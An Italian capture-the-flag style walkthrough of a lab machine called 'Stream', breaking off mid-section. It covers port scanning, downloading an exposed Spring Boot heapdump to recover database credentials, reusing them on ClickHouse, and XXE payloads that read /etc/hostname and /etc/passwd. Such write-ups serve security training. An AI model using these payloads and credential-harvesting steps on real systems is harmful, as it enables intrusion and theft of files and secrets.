# Stream

IP vittima: 10.129.87.41
IP attaccante: 10.10.15.73

## 1. Ricognizione iniziale

La prima fase dell'attacco consiste nell'individuare le porte TCP aperte sulla macchina target, identificare i servizi esposti e raccogliere informazioni utili per le successive attività di enumerazione.

### 1.1 Scansione completa delle porte TCP

Eseguiamo una prima scansione con Nmap per individuare tutte le porte TCP aperte:

```
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.87.41 -oG porte
```

Le opzioni utilizzate sono:

|Opzione|Descrizione|
|---|---|
|`-p-`|Scansiona tutte le 65.535 porte TCP|
|`--open`|Mostra soltanto le porte aperte|
|`-sS`|Esegue una scansione TCP SYN (_Stealth Scan_)|
|`--min-rate 5000`|Imposta un ritmo minimo di invio di 5.000 pacchetti al secondo|
|`-vvv`|Abilita un livello elevato di verbosità|
|`-n`|Disabilita la risoluzione DNS|
|`-Pn`|Considera l'host attivo senza eseguire la fase di host discovery|
|`-oG porte`|Salva il risultato nel file `porte` in formato grepable|
**Risultato:**

```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-16 20:27 CEST
Initiating SYN Stealth Scan at 20:27
Scanning 10.129.87.41 [65535 ports]
Discovered open port 22/tcp on 10.129.87.41
Discovered open port 80/tcp on 10.129.87.41
Discovered open port 40241/tcp on 10.129.87.41
Discovered open port 8081/tcp on 10.129.87.41
Completed SYN Stealth Scan at 20:27, 12.63s elapsed (65535 total ports)

Nmap scan report for 10.129.87.41
Host is up, received user-set (0.062s latency).
Scanned at 2026-10-16 20:27:00 CEST for 12s
Not shown: 65531 closed tcp ports (reset)

PORT      STATE SERVICE         REASON
22/tcp    open  ssh             syn-ack ttl 63
80/tcp    open  http            syn-ack ttl 63
8081/tcp  open  blackice-icecap syn-ack ttl 63
40241/tcp open  unknown         syn-ack ttl 63

Nmap done: 1 IP address (1 host up) scanned in 12.69 seconds
Raw packets sent: 66730 (2.936MB) | Rcvd: 65709 (2.628MB)
```

La scansione individua **quattro porte TCP aperte**:

- **22/tcp:** presumibilmente utilizzata da un servizio SSH.
    
- **80/tcp:** presumibilmente utilizzata da un server HTTP.
    
- **8081/tcp:** classificata inizialmente da Nmap come `blackice-icecap`, sulla base del numero di porta.
    
- **40241/tcp:** servizio non identificato.
    
### 1.2 Identificazione dei servizi e delle versioni

Eseguiamo una scansione mirata sulle quattro porte individuate, utilizzando gli script NSE predefiniti e il rilevamento dei servizi e del sistema operativo:

```
sudo nmap -sC -sV -O -p22,80,8081,40241 10.129.87.41 -oN servizi
```

Le opzioni utilizzate sono:

|Opzione|Descrizione|
|---|---|
|`-sC`|Esegue gli script NSE predefiniti|
|`-sV`|Identifica i servizi e tenta di determinarne la versione|
|`-O`|Esegue il fingerprinting del sistema operativo|
|`-p22,80,8081,40241`|Limita la scansione alle quattro porte individuate|
|`-oN servizi`|Salva il risultato nel file `servizi` in formato normale|

**Risultato:**

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-16 20:29 CEST
Nmap scan report for 10.129.87.41
Host is up (0.027s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)

80/tcp    open  http       nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://api.htb-airport.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)

8081/tcp  open  http       Uvicorn
|_http-server-header: uvicorn
|_http-title: Site doesn't have a title (application/json).

40241/tcp open  tcpwrapped

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 13.98 seconds
```

### 1.3 Analisi dei risultati

La seconda scansione fornisce informazioni più dettagliate sui servizi esposti:

|Porta|Servizio|Versione / Caratteristiche|
|---|---|---|
|`22/tcp`|SSH|OpenSSH 9.6p1 Ubuntu|
|`80/tcp`|HTTP|nginx 1.24.0|
|`8081/tcp`|HTTP|Uvicorn|
|`40241/tcp`|Non identificato|`tcpwrapped`|
#### Porta 22 — SSH

Il servizio SSH utilizza:

```
OpenSSH 9.6p1 Ubuntu 3ubuntu13.19
```

OpenSSH permette l'accesso remoto tramite un canale cifrato.

#### Porta 80 — nginx

Sulla porta 80 è presente:

```
nginx 1.24.0 (Ubuntu)
```

Il risultato più interessante è:

```
http-title: Did not follow redirect to http://api.htb-airport.htb/
```

Il server restituisce un reindirizzamento HTTP verso:

```
http://api.htb-airport.htb/
```

Questo indica che l'applicazione utilizza un nome di dominio specifico.

La presenza di un hostname differente dall'indirizzo IP suggerisce inoltre l'opportunità di verificare se nginx ospiti ulteriori virtual host.
#### Porta 8081 — Uvicorn

La seconda scansione identifica correttamente il servizio:

```
8081/tcp open http Uvicorn
```

Uvicorn è un server ASGI (_Asynchronous Server Gateway Interface_) utilizzato per eseguire applicazioni web Python, frequentemente sviluppate con framework come FastAPI o Starlette.

Il server restituisce contenuti di tipo `application/json`, ma Nmap non identifica un titolo HTML.

La presenza di Uvicorn suggerisce che sulla porta 8081 sia esposta un'applicazione web o un'API HTTP.

Occorre quindi esaminarne gli endpoint e il comportamento.
#### Porta 40241 — tcpwrapped

Per la porta 40241 Nmap restituisce:

```
40241/tcp open tcpwrapped
```

La classificazione `tcpwrapped` indica che Nmap non è riuscito a identificare il servizio, generalmente perché la connessione è stata chiusa rapidamente durante i tentativi di rilevamento.

Questo comportamento può dipendere da controlli di accesso, da un protocollo applicativo particolare oppure dal comportamento stesso del servizio.

Non disponiamo ancora di informazioni sufficienti per identificarlo.
#### Identificazione del sistema operativo

Nmap propone diverse possibili versioni del kernel Linux e di MikroTik RouterOS, ma avverte:

```
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
```

Il rilevamento del sistema operativo non può quindi essere considerato affidabile.

Le informazioni ottenute dalle versioni di OpenSSH e nginx, entrambe associate a Ubuntu, suggeriscono tuttavia che il sistema possa utilizzare una distribuzione Ubuntu Linux.
### 1.4 Configurazione del file /etc/hosts

Poiché il servizio HTTP reindirizza verso `api.htb-airport.htb`, dobbiamo configurare la risoluzione locale del nome.

Apriamo il file `/etc/hosts` sulla nostra macchina Parrot:

```
sudo nano /etc/hosts
```

Aggiungiamo la seguente riga:

```
10.129.87.41    htb-airport.htb api.htb-airport.htb
```

In questo modo possiamo utilizzare il nome di dominio senza dipendere da un server DNS esterno.

### 1.5 Enumerazione dei virtual host

La presenza del dominio `api.htb-airport.htb` suggerisce che nginx possa utilizzare una configurazione basata sull'header HTTP `Host`.

Un singolo indirizzo IP può infatti ospitare più applicazioni web, ciascuna associata a un differente nome di dominio.

Per individuare eventuali virtual host aggiuntivi utilizziamo `ffuf`:

```
ffuf -u http://10.129.87.41/ -H "Host: FUZZ.htb-airport.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac
```

Le opzioni principali sono:

|Opzione|Descrizione|
|---|---|
|`-u`|Indica l'URL del server da analizzare|
|`-H`|Imposta un header HTTP personalizzato|
|`FUZZ`|Segnaposto sostituito con le parole della wordlist|
|`-w`|Specifica la wordlist utilizzata|
|`-ac`|Abilita l'autocalibrazione per filtrare risposte non significative|

Il comando invia richieste HTTP allo stesso indirizzo IP, modificando ogni volta l'header `Host`.

**Risultato:**

```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.87.41/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.htb-airport.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

api                     [Status: 200, Size: 361, Words: 9, Lines: 1, Duration: 42ms]
db                      [Status: 200, Size: 4, Words: 1, Lines: 2, Duration: 90ms]
:: Progress: [5000/5000] :: Job [1/1] :: 743 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

Compare il virtual host:

```
db.htb-airport.htb
```

Aggiorniamo quindi il file `/etc/hosts`:

```
10.129.87.41    htb-airport.htb api.htb-airport.htb db.htb-airport.htb
```

Possiamo ora verificare anche questo virtual host:

```
curl -i http://db.htb-airport.htb/
```

L'analisi delle risposte HTTP permetterà di distinguere il comportamento dei diversi virtual host e identificare le applicazioni associate.

### 1.6 Conclusioni della ricognizione iniziale

La scansione e l'enumerazione iniziale hanno individuato:

- Un servizio SSH sulla porta `22`, che potrebbe consentire l'accesso remoto tramite credenziali valide.
    
- Un server nginx sulla porta `80`, configurato per rispondere a nomi di dominio specifici.
    
- Un server HTTP Uvicorn sulla porta `8081`, da esaminare per identificare le funzionalità esposte.
    
- Un servizio non identificato sulla porta `40241`.
    
- Due virtual host di interesse: `api.htb-airport.htb` e `db.htb-airport.htb`.
    

La superficie di attacco comprende quindi più servizi web, accessibili sia direttamente tramite porte TCP sia mediante differenti virtual host.

La ricognizione fornisce gli elementi necessari per procedere con l'enumerazione delle applicazioni HTTP, analizzando gli endpoint disponibili, le risposte del server e gli eventuali meccanismi di autenticazione.
## 2. Enumerazione dell'applicazione web e scoperta di Spring Boot Actuator

Dalla scansione Nmap abbiamo individuato un server nginx sulla porta 80 che reindirizza le richieste verso il virtual host:

```
http://api.htb-airport.htb/
```

Non conosciamo ancora le tecnologie utilizzate dall'applicazione. Nmap ha identificato nginx 1.24.0, ma questo non ci permette di stabilire quale framework o linguaggio di programmazione sia utilizzato dal backend.

Procediamo quindi con l'enumerazione degli endpoint HTTP.
### 2.1 Enumerazione degli endpoint con ffuf

Per identificare directory e percorsi accessibili utilizziamo `ffuf`.

Eseguiamo:

```
ffuf -u http://api.htb-airport.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -ac
```

Le opzioni utilizzate sono:

|Opzione|Descrizione|
|---|---|
|`-u`|Specifica l'URL da analizzare|
|`FUZZ`|Segnaposto che viene sostituito con le parole della wordlist|
|`-w`|Indica la wordlist utilizzata|
|`-ac`|Abilita l'autocalibrazione, per filtrare automaticamente risposte non significative|

La wordlist `raft-medium-words.txt`, appartenente alla raccolta SecLists, contiene numerosi nomi di directory, file ed endpoint comunemente presenti nelle applicazioni web.

**Risultato:**

```
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://api.htb-airport.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

error                   [Status: 500, Size: 68, Words: 1, Lines: 1, Duration: 99ms]
status                  [Status: 200, Size: 362, Words: 9, Lines: 1, Duration: 68ms]
health                  [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 32ms]
actuator                [Status: 200, Size: 169, Words: 1, Lines: 1, Duration: 57ms]

:: Progress: [63088/63088] :: Job [1/1] :: 112 req/sec :: Duration: [0:04:40] :: Errors: 0
```

| Endpoint    | HTTP Status | Dimensione risposta |
| ----------- | ----------- | ------------------- |
| `/error`    | 500         | 68 byte             |
| `/status`   | 200         | 362 byte            |
| `/health`   | 200         | 15 byte             |
| `/actuator` | 200         | 169 byte            |

Il codice HTTP `200 OK` indica che la richiesta è stata elaborata correttamente e che il server ha restituito una risposta.

Il codice `500 Internal Server Error`, ricevuto per `/error`, segnala invece un errore lato server.

Tra i risultati, quello che attira maggiormente la nostra attenzione è:

```
actuator    [Status: 200, Size: 169, Words: 1, Lines: 1]
```

### 2.2 Perché l'endpoint /actuator è interessante?

Il nome `actuator` è significativo perché **Spring Boot Actuator** è un componente del framework Java Spring Boot.

Spring Boot è un framework utilizzato per sviluppare applicazioni Java, particolarmente diffuso nella realizzazione di servizi web e API REST.

Actuator fornisce una serie di endpoint HTTP destinati al monitoraggio, alla diagnostica e alla gestione delle applicazioni.

Alcuni endpoint comunemente disponibili sono:

|Endpoint|Funzione|
|---|---|
|`/actuator/health`|Mostra lo stato di salute dell'applicazione|
|`/actuator/info`|Restituisce informazioni sull'applicazione|
|`/actuator/metrics`|Espone metriche di funzionamento|
|`/actuator/env`|Permette di esaminare proprietà dell'ambiente applicativo|
|`/actuator/beans`|Elenca i componenti Spring gestiti dall'applicazione|
|`/actuator/heapdump`|Genera un dump della memoria heap della JVM|

La disponibilità di questi endpoint dipende dalla configurazione di Spring Boot. Alcuni potrebbero essere disabilitati oppure richiedere autenticazione.


### 2.3 Analisi dell'endpoint /actuator

Verifichiamo il contenuto restituito dall'endpoint individuato:

```
curl -i http://api.htb-airport.htb/actuator
```

L'opzione `-i` consente di visualizzare sia gli header HTTP sia il corpo della risposta.

Quando la discovery page di Spring Boot Actuator è abilitata, l'endpoint `/actuator` può restituire un documento JSON contenente i collegamenti alle funzionalità diagnostiche disponibili.

```json
{
  "_links": {
    "self": {
      "href": "http://api.htb-airport.htb/actuator",
      "templated": false
    },
    "heapdump": {
      "href": "http://api.htb-airport.htb/actuator/heapdump",
      "templated": false
    }
  }
}
```

Dalla risposta vediamo che è disponibile l'endpoint `heapdump`.
### 2.4 Verifica dell'endpoint /actuator/heapdump

Tra gli endpoint diagnostici di Spring Boot Actuator, uno dei più interessanti dal punto di vista della sicurezza è:

```
/actuator/heapdump
```

Questo endpoint permette di generare e scaricare un **heap dump**, ossia una rappresentazione degli oggetti presenti nella memoria heap della Java Virtual Machine (JVM).

Il contenuto di un heap dump può comprendere:

- Oggetti Java e relativi attributi.
    
- Variabili e stringhe utilizzate dall'applicazione.
    
- Informazioni di configurazione.
    
- Stringhe di connessione ai database.
    
- Credenziali di autenticazione e altri dati sensibili presenti in memoria.
    

Verifichiamo quindi se l'endpoint è accessibile senza autenticazione:

```
curl -sS -D headers.txt -o heapdump.hprof http://api.htb-airport.htb/actuator/heapdump
```

Le opzioni utilizzate sono:

|Opzione|Descrizione|
|---|---|
|`-sS`|Disabilita l'indicatore di avanzamento, mantenendo visibili gli errori|
|`-D headers.txt`|Salva gli header della risposta HTTP|
|`-o heapdump.hprof`|Salva il corpo della risposta nel file indicato|

La verifica conferma che è possibile scaricare il dump della memoria **senza fornire alcuna credenziale**.

Il file ottenuto ha una dimensione di circa **45 MB**.

Controlliamo il file scaricato:

```
ls -lh heapdump.hprof
file heapdump.hprof
```

L'estensione `.hprof` è comunemente utilizzata per i dump della memoria Java.

L'accessibilità di questa funzionalità senza autenticazione rappresenta una vulnerabilità di **Information Disclosure**, perché consente di ottenere dati interni all'applicazione che normalmente non dovrebbero essere disponibili agli utenti esterni.

### 2.5 Analisi dell'heap dump con Eclipse Memory Analyzer

Per analizzare il file `heapdump.hprof` utilizziamo **Eclipse Memory Analyzer (MAT)**, uno strumento specifico per l'analisi dei dump della memoria Java. Oppure possiamo usare il sito **https://heaphero.io** caricando il file.

Apriamo il programma e carichiamo il file:

```
File → Open Heap Dump → heapdump.hprof
```

Una volta completato il caricamento, possiamo utilizzare la vista _Histogram_ per esaminare le classi Java presenti in memoria.

Sappiamo che l'heap dump proviene da un'applicazione **Spring Boot** e quindi abbiamo cercato le classi Java che normalmente gestiscono le connessioni ai database.

Spring Boot utilizza comunemente **HikariCP** una libreria Java utilizzata per gestire i pool di connessioni JDBC, quando l'applicazione impiega le dipendenze JDBC standard.

**HikariCP** gestisce le connessioni ai database e può conservare in memoria informazioni come:

- URL JDBC del database.
- Username di autenticazione.
- Password.
- Proprietà di configurazione del pool.

Una delle sue classi principali è:

```
com.zaxxer.hikari.HikariDataSource
```

Gli oggetti `HikariDataSource` possono contenere informazioni di configurazione relative alle connessioni JDBC, comprese le credenziali di autenticazione.

Esaminando l'istanza individuata e i relativi oggetti associati, recuperiamo:

```
Username: svc_events
Password: Yl4aCgh4y2PnU
```

Le credenziali recuperate rappresentano invece un'informazione sensibile che merita ulteriori verifiche.

### 2.6 Analisi della vulnerabilità

La vulnerabilità individuata consiste nell'esposizione pubblica dell'endpoint:

```
http://api.htb-airport.htb/actuator/heapdump
```

Il problema non è la presenza di Spring Boot Actuator, che costituisce un normale componente diagnostico del framework, ma la possibilità per un utente non autenticato di accedere a una funzionalità estremamente sensibile.

Un dump della memoria può contenere password, token, dati applicativi e informazioni sulla struttura interna del software.

Il download e l'analisi di queste informazioni possono consentire a un attaccante di recuperare credenziali che altrimenti non sarebbero accessibili.
## 3. Accesso a ClickHouse come `svc_events`

Durante l'enumerazione dei virtual host abbiamo individuato:

```
db.htb-airport.htb
```

Il nome `db` suggerisce che il virtual host possa essere associato a un database o a un servizio per la gestione dei dati.
Se lo visitiamo scopriamo infatti che il virtual host espone l'interfaccia HTTP di **ClickHouse**, un database analitico colonnare che consente di eseguire interrogazioni SQL anche attraverso richieste HTTP.

Per verificare l'accesso utilizziamo le credenziali ottenute dall'heap dump.
### 3.1 Verifica delle credenziali

Eseguiamo:

```
curl -sS -G -u svc_events http://db.htb-airport.htb/ --data-urlencode "query=SELECT version() FORMAT TSVRaw"
```

Le opzioni utilizzate sono:

|Opzione|Descrizione|
|---|---|
|`-sS`|Disabilita la barra di avanzamento, ma mostra gli errori|
|`-G`|Invia i parametri della richiesta attraverso la query string HTTP|
|`-u svc_events`|Utilizza l'utente `svc_events` con autenticazione HTTP Basic|
|`--data-urlencode`|Codifica correttamente la query SQL come parametro HTTP|

`curl` richiede la password interattivamente. Inseriamo:

```
Yl4aCgh4y2PnU
```

L'autenticazione funziona e il database risponde correttamente.

La versione identificata è:

```
26.8.1.1746
```

**Abbiamo quindi confermato un caso di credential reuse:** le credenziali recuperate dalla configurazione JDBC dell'applicazione Java sono valide anche per ClickHouse.
### 3.2 Enumerazione dei database

Verifichiamo quali database sono disponibili.

```
curl -sS -G -u svc_events http://db.htb-airport.htb/ --data-urlencode "query=SHOW DATABASES"
```

Tra i database presenti individuiamo:

```
partner_feed
```

Il nome suggerisce un database utilizzato per l'elaborazione di informazioni provenienti da sistemi esterni.

Ne esaminiamo le tabelle:

```
curl -sS -G -u svc_events http://db.htb-airport.htb/ --data-urlencode "query=SHOW TABLES FROM partner_feed"
```

Troviamo queste tabelle:

|Tabella|Funzione|
|---|---|
|`flightleg_raw_kafka`|Acquisizione dei messaggi grezzi provenienti da Kafka|
|`flightleg_raw_mv`|Materialized view per il trasferimento dei messaggi grezzi|
|`flightleg_raw`|Archiviazione dei messaggi XML originali|
|`flightleg_json_kafka`|Acquisizione dei messaggi JSON da Kafka|
|`flightleg_json_mv`|Materialized view per l'estrazione dei campi JSON|
|`flightleg_json`|Archiviazione dei dati elaborati|

### 3.3 Analisi della configurazione delle tabelle

Per comprendere il funzionamento del database utilizziamo `SHOW CREATE TABLE`.

```
curl -sS -G -u svc_events http://db.htb-airport.htb/ --data-urlencode "query=SHOW CREATE TABLE partner_feed.flightleg_raw_kafka"
```

La definizione della tabella contiene informazioni particolarmente interessanti:

```
ENGINE = Kafka
SETTINGS
    kafka_broker_list = 'localhost:9092',
    kafka_topic_list = 'aidx.flightleg.raw.v1',
    kafka_group_name = 'clickhouse_partner_feed_flightleg_raw',
    kafka_format = 'RawBLOB'
```

ClickHouse utilizza quindi il motore `Kafka` per acquisire messaggi provenienti da un broker in ascolto su:

```
localhost:9092
```

Il topic utilizzato è:

```
aidx.flightleg.raw.v1
```

Il formato `RawBLOB` permette di ricevere il contenuto grezzo dei messaggi senza interpretarlo direttamente come una struttura SQL.

Esaminiamo anche la seconda tabella Kafka:

```
curl -sS -G -u svc_events http://db.htb-airport.htb/ --data-urlencode "query=SHOW CREATE TABLE partner_feed.flightleg_json_kafka"
```

Questa utilizza il topic:

```
aidx.flightleg.json.v1
```

e il formato:

```
JSONAsString
```

La presenza di due topic differenti suggerisce una pipeline in cui i messaggi vengono acquisiti in un formato originale e successivamente trasformati in JSON.

Per esaminare i risultati elaborati possiamo interrogare la tabella:

```
curl -sS -G -u svc_events http://db.htb-airport.htb/ --data-urlencode "query=DESCRIBE TABLE partner_feed.flightleg_json"
```

Tra i campi disponibili troviamo:

```
transaction_id
originator
message_type
version
msg_timestamp
airline
flight_number
departure_airport
arrival_airport
origin_date
repeat_number
operational_status
event
```

Questi nomi indicano che il database gestisce informazioni relative ai voli.

Il campo `event` contiene il documento JSON generato dall'elaborazione, mentre `flight_number` contiene il numero di volo estratto dal messaggio.

### 3.4 Verifica dei privilegi dell'utente

Controlliamo i privilegi dell'account:

```
curl -sS -G -u svc_events http://db.htb-airport.htb/ --data-urlencode "query=SHOW GRANTS"
```

L'utente dispone principalmente dei privilegi:

```
GRANT SELECT, INSERT ON partner_feed.* TO svc_events
```

Può quindi leggere e inserire dati nel database `partner_feed`, ma non dispone di privilegi amministrativi generali.

Durante le verifiche constatiamo anche che non può utilizzare liberamente le funzioni ClickHouse che accedono a file locali o URL esterni.

Questo limita la possibilità di leggere direttamente file del sistema tramite SQL.

### 3.5 Conclusioni

Abbiamo ottenuto accesso autenticato a ClickHouse con l'utente `svc_events` e identificato una pipeline basata su Apache Kafka.

Le informazioni più importanti sono:

- Il broker Kafka è configurato su `localhost:9092`.
    
- Il topic `aidx.flightleg.raw.v1` contiene i messaggi originali.
    
- Il topic `aidx.flightleg.json.v1` contiene i messaggi elaborati.
    
- La tabella `partner_feed.flightleg_json` permette di interrogare i risultati dell'elaborazione.
    
- Il nostro utente dispone dei privilegi necessari per leggere i dati prodotti dalla pipeline.
    
## 4. XXE nell'API di ingestione AIDX

Dalla scansione Nmap iniziale sappiamo che la porta 8081 espone un server HTTP **Uvicorn**.

con:

```
curl -i http://10.129.87.41:8081/
```

Il server ha risposto con `HTTP/1.1 200 OK`, restituendo un documento JSON che descriveva il servizio di ingestione AIDX.

La parte decisiva della risposta era:

```
{
  "service": "AIDX flight-leg ingest",
  "what": "Accepts AIDX XML for processing",
  "how": {
    "method": "POST",
    "path": "/feeds/aidx",
    "content_type": "application/xml",
    "max_bytes": 262144
  },
  "required_elements": [
    "IATA_AIDX_FlightLegNotifRQ",
    "Originator",
    "FlightLeg",
    "LegIdentifier"
  ],
  "note": "Ingest does not parse. Full validation happens downstream.",
  "health": "GET /health"
}
```

È qui che abbiamo scoperto l'endpoint `/feeds/aidx`.

La risposta ci forniva direttamente queste informazioni:

| Campo                           | Significato                                  |
| ------------------------------- | -------------------------------------------- |
| `method: POST`                  | Il servizio richiede una richiesta HTTP POST |
| `path: /feeds/aidx`             | Il percorso dell'endpoint                    |
| `content_type: application/xml` | Il contenuto deve essere XML                 |
| `required_elements`             | I campi del messaggio                        |

Non abbiamo quindi dovuto indovinare il percorso: era l'applicazione stessa a comunicarcelo.

### 4.1 Che cos'è AIDX?

AIDX (_Aviation Information Data Exchange_) è uno standard utilizzato nel settore aeroportuale per lo scambio di informazioni operative sui voli mediante messaggi XML.

I messaggi possono contenere informazioni come:

- Identificativo della transazione.
    
- Compagnia aerea.
    
- Numero del volo.
    
- Aeroporto di partenza e di arrivo.
    
- Data del volo.
    
- Stato operativo.
    

Il nome dell'endpoint `/feeds/aidx` suggerisce che il servizio riceva e gestisca messaggi di questo tipo.

### 4.2 Verifica del funzionamento dell'endpoint

Prepariamo un semplice messaggio XML con la struttura che abbiamo individuatoe inviamolo al servizio.

```
curl -i -X POST http://10.129.87.41:8081/feeds/aidx -H "Content-Type: application/xml" --data-binary '<IATA_AIDX_FlightLegNotifRQ TransactionIdentifier="htb-test-001"><Originator Code="HTB"/><FlightLeg><LegIdentifier><FlightNumber>1234</FlightNumber></LegIdentifier></FlightLeg></IATA_AIDX_FlightLegNotifRQ>'
```

Le parti fondamentali sono:

- `-X POST`: utilizza il metodo HTTP POST.
    
- `Content-Type: application/xml`: identifica il corpo della richiesta come documento XML.
    
- `--data-binary`: invia il contenuto senza alterarne i byte.
    

Il servizio risponde:

```
HTTP/1.1 202 Accepted
```

Con un corpo JSON simile a quello osservato:

```
{
  "accepted": true,
  "topic": "aidx.flightleg.raw.v1"
}
```

La risposta conferma che il messaggio è stato accettato e inoltrato al topic Kafka:

```
aidx.flightleg.raw.v1
```

**Attenzione:** HTTP `202 Accepted` non significa necessariamente che il documento XML sia stato elaborato correttamente. Indica soltanto che è stato accettato per l'elaborazione successiva.

### 4.3 Collegamento tra API, Kafka e ClickHouse

Possiamo ora collegare quanto abbiamo osservato sul servizio HTTP con la configurazione di ClickHouse.

Il flusso dei dati risulta essere:

```
                  HTTP POST
                     |
                     v
             /feeds/aidx
              Uvicorn API
                     |
                     v
            Kafka - Topic RAW
          aidx.flightleg.raw.v1
                     |
                     v
               Parser XML
                     |
                     v
            Kafka - Topic JSON
         aidx.flightleg.json.v1
                     |
                     v
           ClickHouse Kafka Engine
                     |
                     v
           Materialized View
                     |
                     v
       partner_feed.flightleg_json
```

Questo è importante perché possiamo inviare un documento XML attraverso l'API e successivamente consultare ClickHouse per verificare come il parser lo abbia interpretato.

### 4.4 Individuazione della vulnerabilità XXE

La tecnologia XML supporta un meccanismo chiamato DTD (_Document Type Definition_), che permette di definire entità da utilizzare all'interno di un documento.

Le entità possono anche riferirsi a risorse esterne.

Ad esempio:

```
<!ENTITY xxe SYSTEM "file:///etc/hostname">
```

Questa dichiarazione definisce un'entità esterna chiamata `xxe` il cui contenuto viene recuperato dal file locale `/etc/hostname`.

L'entità può essere richiamata nel documento XML utilizzando:

```
&xxe;
```

Se il parser XML è configurato per risolvere le entità esterne, potrebbe sostituire `&xxe;` con il contenuto del file.

Questo comportamento prende il nome di **XML External Entity Injection (XXE)**.

Per verificare se il parser dell'applicazione è vulnerabile, prepariamo un messaggio XML contenente un'entità esterna.

### 4.5 Primo test XXE — Lettura di /etc/hostname

Creiamo un file chiamato `xxe.xml`:

```
nano xxe.xml
```

Inseriamo:

```
<?xml version="1.0"?>
<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<IATA_AIDX_FlightLegNotifRQ TransactionIdentifier="htb-xxe-hostname">
  <Originator Code="HTB"/>
  <FlightLeg>
    <LegIdentifier>
      <FlightNumber>&xxe;</FlightNumber>
    </LegIdentifier>
  </FlightLeg>
</IATA_AIDX_FlightLegNotifRQ>
```

La parte fondamentale è:

```
<!ENTITY xxe SYSTEM "file:///etc/hostname">
```

L'entità viene richiamata nel campo:

```
<FlightNumber>&xxe;</FlightNumber>
```

Abbiamo scelto `FlightNumber` perché, dall'analisi della tabella ClickHouse, sappiamo che il parser estrae questo elemento e lo salva nel campo `flight_number`.

Inviamo il messaggio:

```
curl -i -X POST http://10.129.87.41:8081/feeds/aidx -H "Content-Type: application/xml" --data-binary @xxe.xml
```

Il servizio risponde con:

```
HTTP/1.1 202 Accepted
```

Il documento è quindi stato accettato per l'elaborazione.

### 4.6 Verifica della XXE tramite ClickHouse

Ora dobbiamo verificare se il parser ha effettivamente sostituito l'entità XML con il contenuto del file.

Interroghiamo ClickHouse:

```
curl -sS -G -u svc_events http://db.htb-airport.htb/ --data-urlencode "query=SELECT flight_number FROM partner_feed.flightleg_json WHERE transaction_id='htb-xxe-hostname' FORMAT TSVRaw"
```

La query cerca il messaggio attraverso il valore:

```
htb-xxe-hostname
```

che abbiamo impostato nell'attributo XML `TransactionIdentifier`.

Questo permette di distinguere il nostro messaggio dagli altri presenti nel database.

Se il parser ha risolto l'entità esterna, il campo `flight_number` conterrà il contenuto di `/etc/hostname`, anziché la stringa letterale `&xxe;`.

Il test ha successo: il parser restituisce il contenuto del file locale:

```
stream
```

**Abbiamo quindi confermato che l'applicazione è vulnerabile a XXE con lettura di file locali.**

Poiché la pipeline Kafka è asincrona, può essere necessario attendere qualche secondo tra l'invio del messaggio e la query ClickHouse.

### 4.7 Lettura di /etc/passwd

Una volta confermata la vulnerabilità, possiamo utilizzare lo stesso meccanismo per leggere `/etc/passwd`, che contiene l'elenco degli account locali del sistema Linux.

Creiamo un nuovo file:

```
nano xxe-passwd.xml
```

Inseriamo:

```
<?xml version="1.0"?>
<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<IATA_AIDX_FlightLegNotifRQ TransactionIdentifier="htb-xxe-passwd">
  <Originator Code="HTB"/>
  <FlightLeg>
    <LegIdentifier>
      <FlightNumber>&xxe;</FlightNumber>
    </LegIdentifier>
  </FlightLeg>
</IATA_AIDX_FlightLegNotifRQ>
```

Invio:

```
